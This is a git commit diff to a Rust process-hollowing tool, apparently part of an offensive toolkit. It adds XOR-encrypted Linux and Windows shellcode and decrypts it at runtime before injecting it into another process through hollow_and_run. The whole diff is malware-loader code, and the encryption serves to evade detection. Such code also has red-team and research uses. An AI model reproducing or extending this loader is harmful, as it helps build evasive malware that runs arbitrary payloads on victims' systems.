f2322bd9c0f1b4a2dc6f323cf0223bb115884aec
koins <koins@duck.com>
2022-01-30 17:32:11 -0800

    encryption for hollowing too!

--- process_hollowing/src/main.rs
+++ process_hollowing/src/main.rs
@@ -3,16 +3,29 @@
 mod rco_process_hollowing_linux;
 #[cfg(target_os = "linux")]
 use rco_process_hollowing_linux::hollow_and_run;
-#[cfg(target_os = "linux")]
+#[cfg(all(target_os = "linux", not(feature = "encrypted")))]
 const SHELLCODE: &[u8] = rco_config::LINUX_SHELLCODE;
+#[cfg(all(target_os = "linux", feature = "encrypted"))]
+const SHELLCODE: &[u8] = rco_config::ENCRYPTED_LINUX_SHELLCODE;
 
 #[cfg(windows)]
 mod rco_process_hollowing_windows;
 #[cfg(windows)]
 use rco_process_hollowing_windows::hollow_and_run;
-#[cfg(windows)]
+#[cfg(all(windows, not(feature = "encrypted")))]
 const SHELLCODE: &[u8] = rco_config::WINDOWS_SHELLCODE;
+#[cfg(all(windows, feature = "encrypted"))]
+const SHELLCODE: &[u8] = rco_config::ENCRYPTED_WINDOWS_SHELLCODE;
 
 fn main() {
-    hollow_and_run(SHELLCODE);
+    if cfg!(feature = "encrypted") {
+        // Decrypt the shellcode so that it is usable
+        let equalize = rco_utils::equalize_slice_len(rco_config::XOR_KEY, SHELLCODE);
+        let xor_key: &[u8] = &equalize.0[..];
+        let shellcode: &[u8] = &equalize.1[..];
+        let shellcode = rco_utils::xor_u8_slices(xor_key, shellcode).unwrap();
+        hollow_and_run(&shellcode[..]);
+    } else {
+        hollow_and_run(SHELLCODE);
+    }
 }
